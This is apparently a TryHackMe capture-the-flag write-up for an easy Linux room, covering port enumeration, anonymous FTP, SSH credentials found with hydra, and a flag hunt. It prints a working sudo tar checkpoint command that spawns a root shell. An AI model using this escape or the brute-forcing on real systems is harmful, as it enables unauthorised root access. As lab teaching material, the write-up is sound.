#Easy room to practice basic enumeration and privilege escalation in linux

##Nmap scan found the following ports

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
http-server-header: Apache/2.4.18 (Ubuntu)
```
##FTP allows anonymous login

```
found locks.txt & task.txt files in FTP directory
```

##Found login and password to ssh using hydra

```
user: ***
password: *******************

```
##Found flag1: `THM{*****_*********}`

##Using sudo -l found that user can run tar as sudo 
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
opens a shell as root and then found root flag under/root/root.txt

##Found flag2:`THM{******_******}`
